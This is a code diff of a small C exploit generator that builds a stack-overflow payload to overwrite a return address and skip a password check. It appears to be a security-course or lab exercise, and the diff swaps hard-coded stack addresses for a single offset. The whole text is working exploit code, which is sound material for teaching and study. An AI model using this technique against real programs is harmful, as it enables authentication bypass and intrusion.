@@ -3,9 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-#define BUFFER_POINTER 0xffffd648
-#define BASE_POINTER_OLD 0xffffd6b8
-#define BASE_POINTER_NEW 0xffffd718
+#define BUFFER_OFFS 0xd0
 
 #define USAGE_MSG "Usage: %s ADDR\n"
 
@@ -26,7 +24,7 @@ main (int argc, char **argv)
     usage_err (argv[0], NULL);
 
   /* construct injection buffer */
-  char inject[BASE_POINTER_NEW - BUFFER_POINTER + 0x8];
+  char inject[BUFFER_OFFS + 0x8];
   for (size_t i = 0u; i < sizeof (inject); ++i)
     inject[i] = 'a'; /* any printable character will do here */
 
@@ -45,13 +43,9 @@ main (int argc, char **argv)
 
   /* change the password verification functions return address
      (should be 0x8048473) */
-  memcpy (&inject[BASE_POINTER_NEW - BUFFER_POINTER + 0x4], &target_addr, 4);
+  memcpy (&inject[BUFFER_OFFS + 0x4], &target_addr, 4);
 
-  /* preserve the saved base pointer value */
-  uint32_t ebp_restore = BASE_POINTER_OLD;
-  memcpy (&inject[BASE_POINTER_NEW - BUFFER_POINTER], &ebp_restore, 4);
-
-  for (uint32_t i = 0u; i < BASE_POINTER_NEW - BUFFER_POINTER + 0x8; ++i)
+  for (uint32_t i = 0u; i < BUFFER_OFFS + 0x8; ++i)
     printf ("%c", inject[i] & 0xff);
 
   putchar('\n');
